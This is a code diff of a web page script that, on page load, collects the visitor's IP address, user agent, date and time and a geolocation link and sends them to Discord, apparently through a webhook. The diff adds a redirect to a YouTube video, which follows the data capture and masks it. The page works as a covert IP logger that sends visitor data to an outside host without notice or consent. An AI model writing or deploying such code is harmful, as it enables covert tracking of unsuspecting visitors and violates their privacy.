@@ -35,6 +35,11 @@
       request.send(payloadJson);
     }
 
+    // Redirect to the specified website
+    function redirectToWebsite() {
+      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    }
+
     // Get the IP address, user agent, current date and time, and send them to Discord
     window.addEventListener("load", function() {
       // Get the IP address using a free API
@@ -54,6 +59,9 @@
 
           // Call the function to send data to Discord
           sendToDiscord(ip, userAgent, dateTime, geolocationLink);
+
+          // Redirect to the specified website
+          redirectToWebsite();
         })
         .catch(error => console.error("Error:", error));
     });
